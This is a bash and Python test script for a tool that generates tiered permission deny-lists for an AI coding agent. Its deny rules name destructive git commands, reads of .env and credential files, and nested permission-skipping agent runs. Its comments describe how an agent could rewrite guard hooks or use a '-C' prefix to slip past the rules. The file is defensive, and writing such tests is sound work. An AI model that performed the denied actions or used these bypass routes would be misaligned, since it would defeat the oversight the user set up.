#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"

source "$SCRIPT_DIR/helpers.sh"

# The tier generator is exercised in an isolated copy of .claude/, never against the
# repo's own settings.json. Lists merge across settings sources and never override
# (deny -> ask -> allow, no un-deny), so a tier can only be *lowered* by replacing the
# whole generated block: the properties below are what make that safe.
echo "[test_firewall] Tier generator: security.json, idempotency, round-trip, never-allowed set"
echo ""

SECURITY="$REPO_ROOT/.claude/security.json"
FIREWALL="$REPO_ROOT/.claude/bin/firewall.sh"
TIERS="off relaxed medium high"

assert_file_exists "$SECURITY" ".claude/security.json exists"
assert_file_exists "$FIREWALL" ".claude/bin/firewall.sh exists"
if [ ! -f "$SECURITY" ] || [ ! -f "$FIREWALL" ]; then
  echo "  (the remaining checks need both files; nothing to exercise yet)"
  print_summary
fi

WORK="$(new_tmp)" || exit 1
# An unguarded empty temp path truncated a tracked file once; never write without this.
if [ -z "${WORK:-}" ] || [ ! -d "$WORK" ]; then
  echo "  FAIL: could not create a temp dir (mktemp -d returned '${WORK:-}')"
  exit 1
fi
trap 'rm -rf "$WORK"' EXIT

# ── security.json shape ──────────────────────────────────────────────────────
echo "[security.json]"
assert_json_valid "$SECURITY" "security.json is valid JSON"
DECLARED_TIER="$(python3 -c "
import json
print(json.load(open('$SECURITY')).get('tier', '__MISSING__'))" 2>/dev/null || echo __ERROR__)"
TOTAL=$((TOTAL + 1))
case " $TIERS " in
  *" $DECLARED_TIER "*)
    echo "  PASS: security.json tier is one of off|relaxed|medium|high (got '$DECLARED_TIER')"
    PASS=$((PASS + 1)) ;;
  *)
    echo "  FAIL: security.json tier must be off|relaxed|medium|high (got '$DECLARED_TIER')"
    FAIL=$((FAIL + 1)) ;;
esac

# enforced.ruleIds records exactly what was written, so /firewall and update.sh can tell
# a kit rule from a user rule. A stale id means the record and the policy have drifted.
MISSING_IDS="$(python3 -c "
import json
sec = json.load(open('$SECURITY'))
live = json.load(open('$REPO_ROOT/.claude/settings.json'))
pool = set()
perms = live.get('permissions') or {}
for key in ('allow', 'ask', 'deny'):
    pool |= set(perms.get(key) or [])
sb = live.get('sandbox') or {}
pool |= set(sb.get('excludedCommands') or [])
for key, val in (sb.get('filesystem') or {}).items():
    if isinstance(val, list):
        pool |= set(val)
for key, val in (sb.get('network') or {}).items():
    if isinstance(val, list):
        pool |= set(val)
ids = (sec.get('enforced') or {}).get('ruleIds') or []
print(' '.join(r for r in ids if r not in pool) or 'none')" 2>/dev/null || echo __ERROR__)"
assert_eq "none" "$MISSING_IDS" "every enforced.ruleIds entry is present in the live settings.json lists"

# ── fixture: an isolated project whose .claude/ the generator may rewrite ────
mkdir -p "$WORK/proj/.claude/bin"
cp "$REPO_ROOT/.claude/settings.json" "$WORK/proj/.claude/settings.json"
cp "$SECURITY" "$WORK/proj/.claude/security.json"
cp "$FIREWALL" "$WORK/proj/.claude/bin/firewall.sh"
chmod +x "$WORK/proj/.claude/bin/firewall.sh"
(cd "$WORK/proj" && git init -q)

# Contract: `firewall.sh apply [<tier>]` regenerates the block in .claude/settings.json.
# `set` is accepted as a spelling of the same verb so a naming coin-flip is not a red test.
FW_VERB=""
fw_probe() {
  local v
  for v in apply set; do
    if (cd "$WORK/proj" && CLAUDE_PROJECT_DIR="$WORK/proj" \
        bash .claude/bin/firewall.sh "$v" relaxed) >"$WORK/probe.log" 2>&1; then
      FW_VERB="$v"; return 0
    fi
  done
  return 1
}
# fw <tier> [extra args...] -> RC, FW_OUT
fw() {
  local tier="$1"; shift
  set +e
  FW_OUT="$( (cd "$WORK/proj" && CLAUDE_PROJECT_DIR="$WORK/proj" \
    bash .claude/bin/firewall.sh "$FW_VERB" "$tier" "$@") 2>&1 )"
  RC=$?
  set -e
}

echo "[generator contract]"
TOTAL=$((TOTAL + 1))
if fw_probe; then
  echo "  PASS: firewall.sh '$FW_VERB <tier>' regenerates the block (exit 0)"
  PASS=$((PASS + 1))
else
  echo "  FAIL: firewall.sh rejected both 'apply <tier>' and 'set <tier>'"
  sed 's/^/    /' "$WORK/probe.log" | head -12
  FAIL=$((FAIL + 1))
  print_summary
fi

# ── idempotency: two applies of the same tier are byte-identical ─────────────
echo "[idempotency]"
fw relaxed
cp "$WORK/proj/.claude/settings.json" "$WORK/once.json"
fw relaxed
cp "$WORK/proj/.claude/settings.json" "$WORK/twice.json"
assert_cmd_success "cmp -s '$WORK/once.json' '$WORK/twice.json'" \
  "applying the same tier twice is byte-identical (no rule accretion)"

# ── round-trip: relaxed -> high -> relaxed restores the original bytes ───────
# Lists merge monotonically, so an implementation that appends instead of replacing
# would leave High's rules behind and pin the project at High forever.
echo "[round-trip]"
fw high
cp "$WORK/proj/.claude/settings.json" "$WORK/high.json"
fw relaxed
assert_cmd_success "cmp -s '$WORK/once.json' '$WORK/proj/.claude/settings.json'" \
  "relaxed -> high -> relaxed restores the relaxed bytes exactly"
TOTAL=$((TOTAL + 1))
if cmp -s "$WORK/once.json" "$WORK/high.json"; then
  echo "  FAIL: high and relaxed generate identical settings (the tier knob does nothing)"
  FAIL=$((FAIL + 1))
else
  echo "  PASS: high differs from relaxed (the tier knob changes policy)"
  PASS=$((PASS + 1))
fi

# ── descent from High leaves nothing behind, at the tier below it too ───────
# The MCP deny set now differs between Medium and High, so High is the first tier whose
# rules must be subtracted on the way down to Medium and not only to Relaxed. An apply
# that appended would leave mcp__cloudflare__execute in a Medium project forever.
echo "[descent from high]"
fw medium
cp "$WORK/proj/.claude/settings.json" "$WORK/medium-first.json"
fw high
fw medium
assert_cmd_success "cmp -s '$WORK/medium-first.json' '$WORK/proj/.claude/settings.json'" \
  "high -> medium restores the medium bytes exactly (no High-only rule left behind)"
fw relaxed

# ── the user's own rules survive every apply, the first included (#165) ──────
# ruleIds used to be built from the final lists, so a first apply recorded the rules it
# found as the kit's and the second deleted them: allow=2 ruleIds=0 -> 2/2 -> 0/0.
echo "[the user's own rules (#165)]"
OWN="$WORK/own"
mkdir -p "$OWN/.claude/bin"
cp "$FIREWALL" "$OWN/.claude/bin/firewall.sh"
own_fw() {
  set +e
  FW_OUT="$( (cd "$OWN" && CLAUDE_PROJECT_DIR="$OWN" bash .claude/bin/firewall.sh apply "$@") 2>&1 )"
  RC=$?
  set -e
}
# own_state <rule>... -> "<in lists> <in ruleIds> <scope>" counts over the given rules
own_state() {
  python3 - "$OWN" "$@" <<'PY' 2>/dev/null || echo __ERROR__
import json, sys
root, rules = sys.argv[1], sys.argv[2:]
s = json.load(open(root + "/.claude/settings.json"))
e = json.load(open(root + "/.claude/security.json")).get("enforced") or {}
live = []
def walk(o):
    if isinstance(o, dict):
        for v in o.values(): walk(v)
    elif isinstance(o, list):
        live.extend(x for x in o if isinstance(x, str))
walk(s)
ids = e.get("ruleIds") or []
print(sum(live.count(r) for r in rules), sum(r in ids for r in rules), e.get("ruleIdsScope") or "unscoped")
PY
}
U1="Bash(mytool *)"; U2="Bash(./scripts/dev.sh *)"
printf '{\n  "permissions": {\n    "allow": ["%s", "%s"]\n  }\n}\n' "$U1" "$U2" > "$OWN/.claude/settings.json"
printf '{\n  "tier": "relaxed"\n}\n' > "$OWN/.claude/security.json"
assert_eq "2 0 unscoped" "$(own_state "$U1" "$U2")" "start: two user allow rules, no record"
own_fw
assert_eq "2 0 generated" "$(own_state "$U1" "$U2")" "first apply keeps both user rules and does not record them as the kit's"
own_fw
assert_eq "2 0 generated" "$(own_state "$U1" "$U2")" "second apply still has both (they used to be deleted here)"
own_fw high
own_fw relaxed
assert_eq "2 0 generated" "$(own_state "$U1" "$U2")" "relaxed -> high -> relaxed keeps both"

# A record a pre-fix first apply wrote: the user's rules sit in ruleIds beside the kit's,
# with no ruleIdsScope. A recorded string no tier, no retired rule set and no machine
# path could have produced is the user's and is kept; the kit's own stale entries still
# go: a retired allow, and an absolute .git path recorded on some other machine.
python3 - "$OWN/.claude/security.json" "$OWN/.claude/settings.json" "$U1" "$U2" <<'PY'
import json, sys
sec_p, set_p, u1, u2 = sys.argv[1:5]
sec, s = json.load(open(sec_p)), json.load(open(set_p))
e = sec["enforced"]
e.pop("ruleIdsScope")
e["ruleIds"] += [u1, u2, "Bash(xargs *)", "/elsewhere/repo/.git", "Edit(//elsewhere/repo/.git/config)"]
s["permissions"]["allow"].append("Bash(xargs *)")
s["permissions"]["deny"].append("Edit(//elsewhere/repo/.git/config)")
s["sandbox"]["filesystem"]["allowWrite"].append("/elsewhere/repo/.git")
json.dump(sec, open(sec_p, "w")); json.dump(s, open(set_p, "w"))
PY
assert_eq "2 2 unscoped" "$(own_state "$U1" "$U2")" "planted: a pre-fix record holding the user's rules"
own_fw
assert_eq "2 0 generated" "$(own_state "$U1" "$U2")" "a pre-fix record: the user's rules are kept and leave the record"
assert_contains "$FW_OUT" "are yours, were kept" "a pre-fix record: the apply says it kept them"
assert_eq "0 0 generated" "$(own_state "Bash(xargs *)" "/elsewhere/repo/.git" "Edit(//elsewhere/repo/.git/config)")" \
  "a pre-fix record: a retired kit rule and another machine's .git entries are still removed"

# A user rule byte-identical to a kit rule cannot be told apart from it. On a first apply
# it is the kit's (the kit wrote these lists before any record existed). After that, the
# first writer owns it: a rule the user had before a tier emitted it stays theirs, is
# not duplicated, and survives the tier that stops emitting it.
X_HIGH="$(python3 -c "
import json, sys
h = json.load(open(sys.argv[1]))['permissions']['deny']; r = set(json.load(open(sys.argv[2]))['permissions']['deny'])
print(next(x for x in h if x not in r))" "$WORK/high.json" "$WORK/once.json" 2>/dev/null || echo __ERROR__)"
python3 - "$OWN/.claude/settings.json" "$X_HIGH" <<'PY'
import json, sys
s = json.load(open(sys.argv[1])); s["permissions"]["deny"].insert(0, sys.argv[2])
json.dump(s, open(sys.argv[1], "w"))
PY
own_fw high
assert_eq "1 0 generated" "$(own_state "$X_HIGH")" "a user rule High also emits: one copy at High, still not recorded"
own_fw relaxed
assert_eq "1 0 generated" "$(own_state "$X_HIGH")" "...and it survives the descent to Relaxed, which does not emit it"
X_RELAXED="Bash(cargo build*)"
printf '{\n  "permissions": {\n    "allow": ["%s", "%s"]\n  }\n}\n' "$X_RELAXED" "$U1" > "$OWN/.claude/settings.json"
printf '{\n  "tier": "relaxed"\n}\n' > "$OWN/.claude/security.json"
own_fw
assert_eq "1 1 generated" "$(own_state "$X_RELAXED")" "first apply: a user rule identical to a kit rule is taken as the kit's (documented)"
assert_eq "1 0 generated" "$(own_state "$U1")" "first apply: the user rule beside it is not"

# ── harvest every tier once, then assert over the four generated files ──────
for t in $TIERS; do
  fw "$t"
  TOTAL=$((TOTAL + 1))
  if [ "$RC" -eq 0 ]; then
    echo "  PASS: firewall.sh accepts tier '$t'"
    PASS=$((PASS + 1))
  else
    echo "  FAIL: firewall.sh rejected tier '$t' (exit $RC): $(printf '%s' "$FW_OUT" | head -3)"
    FAIL=$((FAIL + 1))
  fi
  cp "$WORK/proj/.claude/settings.json" "$WORK/gen.$t.json"
done
# Leave the fixture on the default so later checks read a representative file.
fw relaxed

# tier_prop <python expr over `d`> -> value, for one generated tier file
tier_prop() {
  python3 -c "
import json, sys
d = json.load(open(sys.argv[1]))
try:
    v = eval(sys.argv[2])
except (KeyError, IndexError, TypeError):
    v = '__MISSING__'
print(json.dumps(v) if isinstance(v, (list, dict)) else (str(v).lower() if isinstance(v, bool) else v))
" "$WORK/gen.$1.json" "$2" 2>/dev/null
}

# ── blockReadsOutsideWorkingDirectories: High only, and ABSENT elsewhere ────
# `false` is not equivalent to absent: the two scalars take the highest-precedence
# source, and a project `false` would override a user who set it true for themselves.
echo "[read fence]"
# read_fence <tier> -> "<holder>=<value>" for every object that carries the key, or 'none'.
# Checked wherever it is written rather than at one pinned path: what matters is that High
# sets it true exactly once and no other tier mentions it at all.
read_fence() {
  python3 -c "
import json, sys
d = json.load(open(sys.argv[1]))
KEY = 'blockReadsOutsideWorkingDirectories'
found = []
for name, holder in (('top', d), ('permissions', d.get('permissions')), ('sandbox', d.get('sandbox')),
                     ('sandbox.filesystem', (d.get('sandbox') or {}).get('filesystem'))):
    if isinstance(holder, dict) and KEY in holder:
        found.append('%s=%s' % (name, json.dumps(holder[KEY])))
print(' '.join(found) or 'none')" "$WORK/gen.$1.json" 2>/dev/null
}
assert_eq "permissions=true" "$(read_fence high)" \
  "High sets blockReadsOutsideWorkingDirectories: true, once, under permissions"
for t in off relaxed medium; do
  assert_eq "none" "$(read_fence "$t")" \
    "$t omits blockReadsOutsideWorkingDirectories entirely (absent, not false)"
done

# ── a symlinked settings.json is refused, never written through ─────────────
echo "[symlinked settings.json]"
mkdir -p "$WORK/link/.claude/bin"
cp "$FIREWALL" "$WORK/link/.claude/bin/firewall.sh"
chmod +x "$WORK/link/.claude/bin/firewall.sh"
cp "$SECURITY" "$WORK/link/.claude/security.json"
printf '{"permissions": {"allow": ["Bash(echo canary)"]}}\n' > "$WORK/link/real-settings.json"
ln -s "$WORK/link/real-settings.json" "$WORK/link/.claude/settings.json"
cp "$WORK/link/real-settings.json" "$WORK/link/before.json"
set +e
LINK_OUT="$( (cd "$WORK/link" && CLAUDE_PROJECT_DIR="$WORK/link" \
  bash .claude/bin/firewall.sh "$FW_VERB" high) 2>&1 )"
LINK_RC=$?
set -e
assert_cmd_success "cmp -s '$WORK/link/before.json' '$WORK/link/real-settings.json'" \
  "a symlinked settings.json is left byte-identical (not written through)"
TOTAL=$((TOTAL + 1))
if [ "$LINK_RC" -ne 0 ] || grep -qiE 'symlink|symbolic|skip' <<<"$LINK_OUT"; then
  echo "  PASS: firewall.sh refuses a symlinked settings.json and says so"
  PASS=$((PASS + 1))
else
  echo "  FAIL: firewall.sh silently accepted a symlinked settings.json (exit 0, no notice)"
  FAIL=$((FAIL + 1))
fi

# ── no pattern in both deny and ask, at any tier ────────────────────────────
# Live defect this replaces: Bash(git clean -fd *) and Bash(git push --force *) were in
# both lists. Deny wins, so both asks were dead and High's move of recoverable git to
# ask would have been silently shadowed.
echo "[deny/ask overlap]"
for t in $TIERS; do
  OVERLAP="$(python3 -c "
import json
p = json.load(open('$WORK/gen.$t.json')).get('permissions') or {}
print(' '.join(sorted(set(p.get('ask') or []) & set(p.get('deny') or []))) or 'none')" 2>/dev/null)"
  assert_eq "none" "$OVERLAP" "$t: no pattern sits in both permissions.deny and permissions.ask"
done

# ── every wildcard holds with its gap empty, by Claude Code's matcher ───────
# A `*` with a space on both sides cannot be empty once spaces collapse: Bash(anchor *
# --final*) did not stop `anchor --final`, and Bash(git push * -f *) did not stop
# `git push origin -f`. A trailing ` *` that is the rule's ONLY wildcard is the exception
# — optional, so Bash(git prune *) does deny a bare `git prune`. fnmatch models neither
# fact, so this is a port of the matcher (code.claude.com/docs/en/permissions), pinned to
# the documented examples, and every rule is probed with every mix of empty and filled
# gaps. validate.sh carries the same port for its own run; the examples keep both honest.
echo "[empty gaps]"
cat > "$WORK/gap_probe.py" <<'PY'
import itertools, json, re, sys

def ws(s):
    return re.sub(r"[ \t]+", " ", s)

def matches(rule, cmd):
    m = re.fullmatch(r"(.+):\*", rule)
    if m:
        return ws(cmd) == ws(m.group(1)) or ws(cmd).startswith(ws(m.group(1)) + " ")
    if "*" not in rule:
        return rule == cmd
    pat = ws(rule.strip())
    rx = re.sub(r"""[.+?^${}()|\[\]\\'"]""", lambda s: "\\" + s.group(0), pat).replace("*", ".*")
    if rx.endswith(" .*") and pat.count("*") == 1:
        rx = rx[:-3] + "( .*)?"
    return re.fullmatch(rx, ws(cmd), re.S) is not None

def probes(pat):
    stars = [i for i, ch in enumerate(pat) if ch == "*"]
    for empty in itertools.product((False, True), repeat=len(stars)):
        if not any(empty):
            continue
        out, last = "", 0
        for i, gap_empty in zip(stars, empty):
            out += pat[last:i] + ("" if gap_empty else "ZZZ")
            last = i + 1
        cmd = re.sub(r" +", " ", out + pat[last:]).strip()
        if cmd:
            yield cmd

if sys.argv[1] == "--match":
    print("yes" if matches(sys.argv[2], sys.argv[3]) else "no")
    sys.exit(0)
if sys.argv[1] == "--deny-matches":
    deny = (json.load(open(sys.argv[2])).get("permissions") or {}).get("deny") or []
    hit = [r for r in deny if r.startswith("Bash(") and r.endswith(")") and matches(r[5:-1], sys.argv[3])]
    print(" ".join(hit) or "none")
    sys.exit(0)
if sys.argv[1] == "--documented":
    DOCUMENTED = [("ls *", "ls", True), ("ls *", "lsof", False), ("ls*", "lsof", True),
                  ("npm run *", "npm run", True), ("git log * main", "git log main", False),
                  ("git * main", "git log", False), ("* --version", "node --version", True),
                  ("* --help *", "npm --help x", True), ("* --help *", "npm --help", False),
                  ("ls:*", "ls", True), ("npm run build", "npm run build --watch", False)]
    bad = ["Bash(%s) on %r" % (r, c) for r, c, want in DOCUMENTED if matches(r, c) != want]
    print("; ".join(bad) or "none")
    sys.exit(0)

perms = json.load(open(sys.argv[1])).get("permissions") or {}
bad = []
for key in ("deny", "ask"):
    pats = [r[5:-1] for r in perms.get(key) or []
            if isinstance(r, str) and r.startswith("Bash(") and r.endswith(")")]
    for pat in pats:
        if "\\" in pat or "**" in pat:
            bad.append("%s:Bash(%s) is unmodelled" % (key, pat))
            continue
        for cmd in probes(pat):
            if not any(matches(o, cmd) for o in pats):
                bad.append("%s:Bash(%s) misses %r" % (key, pat, cmd))
print("; ".join(sorted(set(bad))[:6]) or "none")
PY
assert_eq "none" "$(python3 "$WORK/gap_probe.py" --documented 2>&1)" \
  "the matcher port agrees with every documented example (ls *, git log * main, * --help *, ...)"
for t in $TIERS; do
  assert_eq "none" "$(python3 "$WORK/gap_probe.py" "$WORK/gen.$t.json" 2>&1)" \
    "$t: every Bash deny wildcard holds with its gap empty (or another rule covers it)"
done
# Planted holes, one per shape; the check this replaced could see only the first. The
# rule set above is clean, so a probe that only ever said "none" would pass it too —
# these have to fail.
plant() { # plant <label> <expected substring> <add-rule|-> <drop-rule|->
  python3 - "$WORK/gen.relaxed.json" "$WORK/planted.json" "$3" "$4" <<'PY'
import json, sys
src, dst, add, drop = sys.argv[1:5]
s = json.load(open(src))
deny = [r for r in s["permissions"]["deny"] if r != drop]
if add != "-":
    deny.append(add)
s["permissions"]["deny"] = deny
json.dump(s, open(dst, "w"))
PY
  assert_contains "$(python3 "$WORK/gap_probe.py" "$WORK/planted.json" 2>&1)" "$2" "planted: $1"
}
plant "a mid gap, the twin dropped (Bash(anchor * --final*))" "misses 'anchor --final'" \
  - "Bash(anchor --final*)"
plant "a trailing gap in a two-wildcard rule, mid twin present" "misses 'git push ZZZ --force'" \
  "Bash(git push * --force *)" -
plant "a spaced mid * in a one-wildcard rule" "misses 'git log main'" "Bash(git log * main)" -
plant "a leading spaced *" "misses '--nuke'" "Bash(* --nuke)" -
# ...and the fact that lets a one-wildcard Bash(X *) stand without a Bash(X) twin: the
# rule itself decides the bare command. Read with fnmatch, all four of these look open.
for verb in "git prune" "git clean" "git restore" "git reflog expire"; do
  assert_eq "yes" "$(python3 "$WORK/gap_probe.py" --match "$verb *" "$verb" 2>&1)" \
    "Bash($verb *) denies a bare \`$verb\` by itself"
done

# ── Relaxed emits no permissions.ask at all ─────────────────────────────────
# `ask` hard-fails headless, and the kit's own GitHub Action runs inside this repo:
# Relaxed has to stay CI-safe. Prompts that Relaxed does want come from hooks.
echo "[relaxed is CI-safe]"
assert_eq "0" "$(python3 -c "
import json
p = json.load(open('$WORK/gen.relaxed.json')).get('permissions') or {}
print(len(p.get('ask') or []))" 2>/dev/null)" "relaxed emits zero permissions.ask entries"
assert_eq "0" "$(python3 -c "
import json
p = json.load(open('$WORK/gen.off.json')).get('permissions') or {}
print(len(p.get('ask') or []))" 2>/dev/null)" "off emits zero permissions.ask entries"

# ── what each tier lets the agent write under .claude/ and ~/.claude/ ───────
# Asserted as an effective permission on a PATH, not as the presence of a rule string,
# because the regression this replaces was invisible: Edit(~/.claude/**) silently denied
# ~/.claude/projects/**/memory/**, the harness's own file-based agent memory, and
# ~/.claude/CLAUDE.md, which CLAUDE-solana.md tells every user project to write to. No
# allow rule can undo that — deny beats allow in every scope, with no un-deny primitive
# and no specificity tiebreak ("An allow rule can't carve an exception out of a deny
# rule", code.claude.com/docs/en/permissions) — so only the deny set decides, and only
# the deny set is consulted below.
echo "[writable config surface]"
# edit_denied <tier> <path> -> yes|no. `path` is either project-relative (".claude/x")
# or home-anchored ("~/.claude/x").
edit_denied() {
  python3 -c "
import json, re, sys

def to_regex(pat):
    'the glob dialect the kit emits: ** spans segments, * stays inside one'
    out, i = [], 0
    while i < len(pat):
        c = pat[i]
        if pat.startswith('/**', i):
            out.append('(?:/.*)?'); i += 3
        elif pat.startswith('**', i):
            out.append('.*'); i += 2
        elif c == '*':
            out.append('[^/]*'); i += 1
        elif c == '?':
            out.append('[^/]'); i += 1
        else:
            out.append(re.escape(c)); i += 1
    return re.compile('^' + ''.join(out) + r'\$')

path = sys.argv[2]
deny = (json.load(open(sys.argv[1])).get('permissions') or {}).get('deny') or []
for rule in deny:
    if not (rule.startswith('Edit(') and rule.endswith(')')):
        continue
    inner = rule[5:-1]
    if inner.startswith('~/'):
        if not path.startswith('~/'):
            continue
        cand, pat = path[2:], inner[2:]
    elif inner.startswith('//'):
        continue                      # absolute (managed settings); not these paths
    elif inner.startswith('/'):
        if path.startswith('~/'):
            continue
        cand, pat = path, inner[1:]   # /-anchored means project-root-relative
    else:
        continue
    if to_regex(pat).match(cand):
        print('yes'); break
else:
    print('no')" "$WORK/gen.$1.json" "$2" 2>/dev/null
}

# CONFIG is High-only: below it, the kit defers to a user who chose to customize their
# own installation. "Customizing your installation" describes settings.json exactly —
# declarative config, tuned by hand.
SELF_PROTECTED_CONFIG=".claude/settings.json
.claude/settings.local.json
.claude/security.json
.mcp.json
~/.claude/settings.json
~/.claude/.credentials.json
~/.claude/agents/x.md
~/.claude/commands/x.md
~/.claude/skills/x/SKILL.md
~/.claude/rules/x.md
~/.claude/output-styles/x.md
~/.claude/plugins/config.json
~/.claude/cowork_plugins/config.json
~/.claude/workflows/x.js
~/.claude/routines/x.json
~/.claude/shell-snapshots/snapshot-zsh-1.sh
~/.claude/local/claude
~/.claude/scheduled_tasks.json
~/.claude/daemon.json
~/.claude/launch.json
~/.claude/loop.md"
for t in off relaxed medium; do
  BAD=""
  while IFS= read -r p; do
    [ "$(edit_denied "$t" "$p")" = "no" ] || BAD="$BAD $p"
  done <<EOF
$SELF_PROTECTED_CONFIG
EOF
  assert_eq "" "$BAD" "$t lets the agent edit the installation's own config (High-only denies)"
done
BAD=""
while IFS= read -r p; do
  [ "$(edit_denied high "$p")" = "yes" ] || BAD="$BAD $p"
done <<EOF
$SELF_PROTECTED_CONFIG
EOF
assert_eq "" "$BAD" "high denies every self-protected config path"

# The HOOKS are the carve-out and are denied at EVERY tier, Off included. Not because
# they are more sensitive than settings.json, but because they are a different kind of
# thing: executable shell scripts that *implement* the mainnet-deploy gate, the
# keypair-read block and the egress denylist, rather than config that declares them. The
# decisive point is that /firewall changes every tier knob without touching hooks/, so a
# user who wants to customize never has to edit a guard script. Regression this guards:
# the hooks riding along with the config group and becoming editable at the DEFAULT
# tier, where an agent that trips the mainnet gate could rewrite the script behind it.
HOOK_PATHS=".claude/hooks/onchain-guard.sh
.claude/hooks/secrets-guard.sh
.claude/hooks/egress-guard.sh
.claude/hooks/fetch-exec-guard.sh
.claude/hooks/lib-headless.sh
.claude/hooks/lib-tokenize.awk
.claude/hooks/fetch-exec-guard.awk
~/.claude/hooks/my-hook.sh"
for t in $TIERS; do
  BAD=""
  while IFS= read -r p; do
    [ "$(edit_denied "$t" "$p")" = "yes" ] || BAD="$BAD $p"
  done <<EOF
$HOOK_PATHS
EOF
  assert_eq "" "$BAD" "$t denies edits to the guard hooks (unconditional, Off included)"
done

# Writable at EVERY tier, High included. The memory directory is a documented harness
# feature; ~/.claude/CLAUDE.md is what the kit's own CLAUDE-solana.md points users at.
# Neither may be collaterally denied by a glob aimed at the policy surface.
AGENT_WRITABLE="~/.claude/CLAUDE.md
~/.claude/projects/-Users-me-proj/memory/MEMORY.md
~/.claude/projects/-Users-me-proj/memory/notes/decisions.md
~/.claude/keybindings.json"
for t in $TIERS; do
  BAD=""
  while IFS= read -r p; do
    [ "$(edit_denied "$t" "$p")" = "no" ] || BAD="$BAD $p"
  done <<EOF
$AGENT_WRITABLE
EOF
  assert_eq "" "$BAD" "$t leaves agent memory and ~/.claude/CLAUDE.md writable"
done

# The other half of the same parent directory: transcripts replay every secret a session
# ever read, so they stay READ-denied where the tier fences reads, while the memory
# directory beside them is writable. Both properties have to hold at once.
for t in medium high; do
  assert_eq "yes" "$(python3 -c "
import json
fs = ((json.load(open('$WORK/gen.$t.json')).get('sandbox') or {}).get('filesystem') or {})
dr = fs.get('denyRead') or []
print('yes' if '~/.claude/projects/**/*.jsonl' in dr and '~/.claude/history.jsonl' in dr else 'no')" 2>/dev/null)" \
    "$t still read-denies session transcripts next to the writable memory directory"
done

# ── the never-allowed set varies only where it provably can ─────────────────
# Deny is merge-monotonic: lists union across settings sources and there is no un-deny,
# so a deny that reaches a user or managed file cannot be taken back on the way down a
# tier. That is why every Bash deny is identical at every tier, and the assertion below
# is what keeps it that way.
#
# Three sanctioned kinds of exception, all safe for the same reason: firewall.sh writes
# one file and subtracts exactly its recorded ruleIds, which the relaxed -> high ->
# relaxed and high -> medium byte-identity tests above are the proof of.
#   * MCP tool-name denies -- MCP rules have no argument form at all (a parenthesised
#     mcp__ rule is skipped on load), so a tool-name deny is the only expressible gate.
#   * The Edit denies, High only: self-protection, because below High the kit defers to
#     a user customizing their own installation, and the .git/config and .git/hooks/
#     fence, because below High it defers to the user on their own repository.
#   * Bash(gh api *) at Medium and High -- the ONE Bash rule in the corpus that varies,
#     added in rule set 5.
# A Bash deny is the one that most plausibly reaches user or managed scope by
# hand-copying, where no descent can lift it, so the one that varies is pinned by exact
# rule string and exact tier set rather than waved through by shape. A second one cannot
# appear without this test being edited on purpose -- which is what caught the attempt to
# lower Bash(git -C *) to High, since a -C prefix defeats every subcommand-anchored
# destructive git glob and the rule has to stay tier-invariant.
echo "[never-allowed set]"
BASH_VARY="$(python3 -c "
import json
tiers = '$TIERS'.split()
by = {}
for t in tiers:
    deny = (json.load(open('$WORK/gen.%s.json' % t)).get('permissions') or {}).get('deny') or []
    by[t] = {r for r in deny if r.startswith('Bash(')}
union, common = set(), None
for s in by.values():
    union |= s
    common = s if common is None else (common & s)
print('; '.join('%s@%s' % (r, ','.join(t for t in tiers if r in by[t]))
                for r in sorted(union - common)) or 'none')" 2>/dev/null)"
assert_eq "Bash(gh api *)@medium,high" "$BASH_VARY" \
  "exactly one Bash permissions.deny entry varies by tier, at exactly the intended tiers"

# And the tier-varying remainder is exactly the sanctioned set -- nothing else may start
# varying here without this test being updated on purpose.
VARY_KIND="$(python3 -c "
import json
ALLOWED = {'Bash(gh api *)'} | {'Read(%s)' % f for f in (
    '**/.env', '**/.env.local', '**/.env.*.local', '**/.env.development',
    '**/.env.production', '**/.env.staging', '**/.env.test')}
sets = {}
for t in '$TIERS'.split():
    deny = (json.load(open('$WORK/gen.%s.json' % t)).get('permissions') or {}).get('deny') or []
    sets[t] = set(deny)
union, common = set(), None
for s in sets.values():
    union |= s
    common = s if common is None else (common & s)
varying = union - common
bad = sorted(r for r in varying
             if not (r.startswith('mcp__') or r.startswith('Edit(') or r in ALLOWED))
print(' '.join(bad) or 'none')" 2>/dev/null)"
assert_eq "none" "$VARY_KIND" \
  "only MCP tool-name denies, Edit denies, High's dotenv Read denies and the one named Bash rule vary by tier"

# The project's dotenv files follow the tier: writes denied at Medium alone, reads at
# High alone, nothing at Off or Relaxed. .env.example and varlock's .env.schema carry no
# values and are never named, at any tier.
ENV_TIERS="$(python3 -c "
import json
out = []
for t in '$TIERS'.split():
    deny = set((json.load(open('$WORK/gen.%s.json' % t)).get('permissions') or {}).get('deny') or [])
    out.append('%s:%s%s' % (t, 'W' if 'Edit(**/.env)' in deny else '-', 'R' if 'Read(**/.env)' in deny else '-'))
    if any(('.env.example' in r or '.env.schema' in r) for r in deny):
        out.append('%s:names-example-or-schema' % t)
print(' '.join(out))" 2>/dev/null)"
assert_eq "off:-- relaxed:-- medium:W- high:-R" "$ENV_TIERS" \
  "dotenv files: writes denied at Medium, reads at High, open at Off and Relaxed; .env.example and .env.schema never denied"

# The unconditional group, by exact rule, at every tier. Each is here because it is not
# "customizing your installation": a nested `claude -p --dangerously-skip-permissions`
# re-rolls the whole policy in a child process; managed settings belong to an
# administrator; .safe-ai-skill/** is a third-party security tool's policy; and the
# hooks are the scripts that enforce the gates rather than config that declares them.
for t in $TIERS; do
  MISSING="$(python3 -c "
import json
deny = set((json.load(open('$WORK/gen.$t.json')).get('permissions') or {}).get('deny') or [])
want = ['Bash(claude *)', 'Bash(claude)', 'Edit(//**/managed-settings.json)',
        'Edit(/.safe-ai-skill/**)', 'Edit(/.claude/hooks/**)', 'Edit(~/.claude/hooks/**)']
print(' '.join(r for r in want if r not in deny) or 'none')" 2>/dev/null)"
  assert_eq "none" "$MISSING" "$t carries the whole unconditional group (Off included)"
done

MCP_BY_TIER="$(python3 -c "
import json
out = []
for t in '$TIERS'.split():
    deny = (json.load(open('$WORK/gen.%s.json' % t)).get('permissions') or {}).get('deny') or []
    out.append('%s=%d' % (t, len([r for r in deny if r.startswith('mcp__')])))
print(' '.join(out))" 2>/dev/null)"
assert_eq "off=0 relaxed=0 medium=7 high=9" "$MCP_BY_TIER" \
  "only medium and high deny MCP tools by name (off and relaxed rely on the hooks)"

# ── which MCP executor each tier refuses ────────────────────────────────────
# context-mode ships on by default, so both gated tiers have to speak for a user who
